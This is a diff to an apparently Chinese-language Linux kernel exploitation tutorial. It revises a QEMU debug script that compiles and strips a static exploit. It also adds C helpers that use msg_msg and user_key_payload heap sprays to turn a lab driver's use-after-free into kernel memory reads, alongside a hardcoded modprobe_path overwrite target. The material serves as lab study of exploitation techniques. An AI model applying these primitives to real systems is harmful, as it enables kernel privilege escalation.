@@ -800,7 +800,19 @@ qemu-system-x86_64 \
 则本地调试脚本如下所示
   ```bash
 #!/bin/sh
-set -xe
+set -x
+
+apt_search()
+{
+    for arg in "$@"
+    do
+        apt list --installed | grep "$arg";
+        if [ ! "$?" = "0" ]; then
+            return 1
+        fi
+    done
+    return 0
+}
 
 # 根文件系统路径
 ROOT=$(pwd)/rootfs
@@ -809,14 +821,21 @@ ROOT=$(pwd)/rootfs
 ROOTFS=$(pwd)/rootfs.cpio
 
 # 内核镜像路径
-KERNEL=$(pwd)/bzImage
+KERNEL=$(pwd)/kernel
 
 # exp源代码路径
 EXP=$(pwd)/exp.c
 
+# 安装所需要的依赖包
+apt_search libkeyutils-dev musl-tools
+if [ ! "$?" = "0" ]; then
+    sudo apt-get install -y libkeyutils-dev musl-tools
+fi
+
 # 静态编译exp
-gcc -o $(pwd)/rootfs/exp.i -Werror -Wall -E ${EXP} \
-    && musl-gcc -o $(pwd)/rootfs/exp -Werror -Wall -static $(pwd)/rootfs/exp.i \
+gcc -E -Werror -Wall -o $(pwd)/rootfs/exp.i ${EXP} \
+    && musl-gcc -Os -Werror -Wall -static -o $(pwd)/rootfs/exp $(pwd)/rootfs/exp.i -lpthread \
+    && strip -s $(pwd)/rootfs/exp \
     && rm -rf $(pwd)/rootfs/exp.i
 
 # 生成文件系统映像
@@ -828,11 +847,9 @@ qemu-system-x86_64 \
     -nographic \
     -monitor /dev/null \
     -serial mon:stdio \
-    -kernel ${KERNEL} \
+    -kernel ${KERNEL}/arch/x86_64/boot/bzImage \
     -append 'console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr' \
     -initrd ${ROOTFS} \
-    -smp cores=2,threads=2 \
-    -cpu kvm64,smep,smap \
     -no-shutdown -no-reboot \
     -s
 ```
@@ -1682,6 +1699,7 @@ int main(void) {
 #define _GNU_SOURCE
 #include <errno.h>
 #include <fcntl.h>
+#include <keyutils.h>
 #include <linux/userfaultfd.h>
 #include <poll.h>
 #include <pthread.h>
@@ -1735,6 +1753,9 @@ struct list_head {
 #define __X32_SYSCALL_BIT   0x40000000
 #define syscall_x32(nr, args...) \
     syscall((nr) + __X32_SYSCALL_BIT, ##args)
+/* 在/usr/include/x86_64-linux-gnu/bits/syscall.h中
+ * 查看x64下的系统调用信息
+ */
 #define syscall_x64(nr, args...) \
     syscall((nr), ##args)
 
@@ -1886,7 +1907,7 @@ pthread_t userfaultfd_exp(void *addr, uint64_t len, void *(*thread)(void *arg),
     assert(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) != -1);
 
     printf("[userfaultfd_exp] create the thread to handle userfaultfd events\n");
-    assert((uffd_arg = malloc(sizeof(uffd_arg))) != NULL);
+    assert((uffd_arg = malloc(sizeof(*uffd_arg))) != NULL);
     uffd_arg->uffd = uffd;
     uffd_arg->handler = handler;
     uffd_arg->pg_size = PG_SIZE;
@@ -1898,7 +1919,7 @@ pthread_t userfaultfd_exp(void *addr, uint64_t len, void *(*thread)(void *arg),
     return thr;
 }
 
-/* struct msg_msg原语
+/* struct msg_msg读
  * 结构体:
  *          struct msg_msg {
  *              struct list_head m_list;
@@ -1910,7 +1931,7 @@ pthread_t userfaultfd_exp(void *addr, uint64_t len, void *(*thread)(void *arg),
  *          };
  *
  * 条件:
- *      1. 驱动中存在UAF，可以更改内存的[0x18, 0x28)处的值
+ *      1. 驱动中存在UAF，块大小为[0x30, 0x2000]，可以更改内存的[0x18, 0x28)处的值
  *      2. 如果更改了内存的[0x0, 0x10)的值，则需要调用recv_msg()，其需要内核
  * 开启CONFIG_CHECKPOINT_RESTORE设置；否则调用recv_msg_nocopy()即可
  *      3. recv_msg()读取信息时，需要和struct msg_msg的m_ts相同大小，否则会
@@ -1922,11 +1943,10 @@ pthread_t userfaultfd_exp(void *addr, uint64_t len, void *(*thread)(void *arg),
  *      2. send_msg():@content, 即用户定义的消息内容，其会被复制到
  * 内核态申请的内存中，主要用来查找这部分内存，可以设置为标志性字符串，如
  * "hhaawwkk1"等
- *      3. send_msg():@content_size，即用户定义的消息内容数组长度
- *      4. recv_msg*():@qid，消息队列id，用来标识不同队列，是send_msg()
+ *      3. recv_msg*():@qid，消息队列id，用来标识不同队列，是send_msg()
  * 返回值
- *      5. recv_msg*():@size，想要从消息队列中获取的字节数，其包含0x8的mtype
- * 内容
+ *      4. recv_msg*():@size，想要从消息队列中获取的字节数，其包含0x8的mtype
+ * 内容和struct msg_msg头和@size的数据
  *
  * 返回值:
  *      1. send_msg():@ret返回创建的消息队列id
@@ -1935,6 +1955,7 @@ pthread_t userfaultfd_exp(void *addr, uint64_t len, void *(*thread)(void *arg),
  * 参考:
  * https://www.anquanke.com/post/id/252558
  * https://elixir.bootlin.com/linux/v6.1/source/ipc/msg.c#L848
+ * https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1090
  */
  struct msg_msg {
     struct list_head m_list;
@@ -1943,24 +1964,26 @@ pthread_t userfaultfd_exp(void *addr, uint64_t len, void *(*thread)(void *arg),
     struct msg_msgseg *next;
     void *security; // 由于未开启SELinux，该字段恒为0
 };
-int send_msg(size_t size, const char *content, size_t content_size) {
+int send_msg(size_t size, const char *content) {
 
     int qid;
     struct _msgbuf {
         long mtype;
-        char mtext[size - 0x30];
+        char mtext[size - sizeof(struct msg_msg)];
     } msg;
 
     // 创建
     assert((qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) != -1);
 
     msg.mtype = 1;
-    memcpy(msg.mtext, content, content_size);
+    strncpy(msg.mtext, content, size - sizeof(struct msg_msg));
     assert(msgsnd(qid, &msg, sizeof(msg.mtext), 0) != -1);
+
+    printf("[send_msg] msgget = %d\n", qid);
+    fflush(stdout);
 
     return qid;
 }
-#define send_msg_str(size, msg) (send_msg((size), (msg), strlen(msg)+1))
 void *recv_msg(int qid, size_t size) {
 
     void *memdump;
@@ -1989,6 +2012,78 @@ void *recv_msg_nocopy(int qid, size_t size) {
 }
 
 
+
+/* struct user_key_payload读
+ * 结构体:
+ *        struct user_key_payload {
+ *        	struct rcu_head	rcu;		// RCU destructor
+ *        	unsigned short	datalen;	// length of this data
+ *        	char		        data[] __aligned(__alignof__(u64)); // actual data
+ *        };
+ * 
+ * 条件：
+ *      1. 驱动中存在UAF，块大小为[0x18, 0x10000]，可以更改内存的[0x10, 0x14)处的值
+ * 
+ * 参数:
+ *      1. spray_addkey():@payload，即用户上传的key内容，被复制到data部分
+ *      2. spray_addkey():@size，即内核要申请的data大小,h. 注意，spray_addkey()中，
+ * 内核会申请两个大小相近的块，`kvmalloc(@size, GFP_KERNEL)`和
+ * `kmalloc(sizeof(struct user_key_payload) + @size, GFP_KERNEL)`
+ * 
+ * 返回值：
+ *      1. spray_addkey():@ret，即创建的key的唯一表示
+ * 
+ * 参考：
+ * https://www.anquanke.com/post/id/228233#h3-10
+ * https://github.com/Markakd/n1ctf2020_W2L/blob/main/leak.c
+ * https://elixir.bootlin.com/linux/v6.1/source/security/keys/keyctl.c#L74
+ * https://elixir.bootlin.com/linux/v6.1/source/security/keys/key.c#L816
+ * https://elixir.bootlin.com/linux/v6.1/source/security/keys/user_defined.c#L59
+ */
+#define KEY_MAX_DESC_SIZE 4096
+struct callback_head {
+	struct callback_head *next;
+	void (*func)(struct callback_head *head);
+} __attribute__((aligned(sizeof(void *))));
+#define rcu_head callback_head
+struct user_key_payload {
+	struct rcu_head	rcu;		/* RCU destructor */
+	unsigned short	datalen;	/* length of this data */
+	char		data[] __attribute__ ((__aligned__(sizeof(__u64)))); /* actual data */
+};
+key_serial_t spray_addkey(const char *payload, uint32_t size)
+{
+  char *payload_buf;
+  key_serial_t key;
+
+  /* 减去struct user_key_payload头，确保内核申请的大小为
+   * @size
+   */
+  assert(size >= sizeof(struct user_key_payload));
+  size -= sizeof(struct user_key_payload);
+
+  assert((payload_buf = malloc(size)) != NULL);
+  strncpy(payload_buf, payload, size);
+
+  assert((key = syscall_x64(SYS_add_key, "user", "kernel-pwn-key", payload_buf, size,
+                        KEY_SPEC_PROCESS_KEYRING)) != -1);
+
+  printf("[spray_addkey] add_key = %x\n", key);
+  fflush(stdout);
+
+  return key;
+}
+void *spray_readkey(key_serial_t key, uint32_t size)
+{
+  void *payload;
+
+  assert((payload = malloc(size)) != NULL);
+
+  assert(syscall_x64(SYS_keyctl, KEYCTL_READ, key, payload, size, 0) == size);
+
+  return payload;
+}
+
 /* 本次exp的符号定义
  */
 #define VULN_WRITE		0x1737
@@ -1996,7 +2091,7 @@ void *recv_msg_nocopy(int qid, size_t size) {
 #define VULN_ALLOC		0x1739
 #define VULN_FREE		0x173A
 
-long long *modprobe_path = (long long*) 0xffffffff82851480;
+long long *modprobe_path = (long long*) 0xffffffff82651120;
 long long fake_modprobe_path = 0x612f706d742f;
 
 typedef struct {
@@ -2038,8 +2133,8 @@ int main(void)
 
 
 
-    /* 尝试使用userfaultfd扩大条件竞争
-     */
+    ///* 尝试使用userfaultfd扩大条件竞争
+    // */
     //Data data;
     //long long buf;
     //uint64_t len;
@@ -2066,6 +2161,8 @@ int main(void)
 
 
 
+
+
     ///* 尝试利用struct msg_msg结构体
     // * 进行数据读取或写入
     // */
@@ -2085,13 +2182,46 @@ int main(void)
     //// 开始heap spray
     //qid = send_msg_str(size, "hhaawwkk1");
 
-    //// 修改UAF的struct msg_msg的m_ts字段
+    //// 利用UAF修改struct msg_msg的m_ts字段
     //data.addr = (long long*)(kbuf1 + offsetof(struct msg_msg, m_ts));
     //data.val = 0x1000;
     //assert(ioctl(gfd1, VULN_WRITE, &data) == 0);
 
     //assert((kbuf2 = recv_msg_nocopy(qid, 0x1000)) != NULL);
     //assert(((long long)kbuf1 + 0x100) == ((long long*)kbuf2)[0x13]);
+
+
+
+
+
+    ///* 尝试利用struct user_key_payload结构体
+    // * 进行数据读取或写入
+    // */
+    //Data data;
+    //char *kbuf1, *kbuf2;
+    //int size = 0x70;
+    //key_serial_t key;
+
+    //assert((gfd1 = open("/dev/vuln", O_RDWR)) >= 0);
+
+    //// 内核态申请0x80大小的内存
+    //data.val = size;
+    //assert(ioctl(gfd1, VULN_ALLOC, &data) == 0)
+    //kbuf1 = (char *)data.addr;
+
+    //// 制造UAF
+    //assert(ioctl(gfd1, VULN_FREE, &data) == 0)
+
+    //// 开始heap spray
+    //key = spray_addkey("hhaawwkk1", size);
+
+    //// 利用UAF修改struct user_key_payload的datalen字段
+    //data.addr = (long long*)(kbuf1 + offsetof(struct user_key_payload, datalen));
+    //data.val = 0x1000;
+    //assert(ioctl(gfd1, VULN_WRITE, &data) == 0);
+
+    //kbuf2 = spray_readkey(key, 0x1000);
+    //assert(((long long)kbuf1 + 0x100) == ((long long*)kbuf2)[0x15]);
     return 0;
 }
 ```
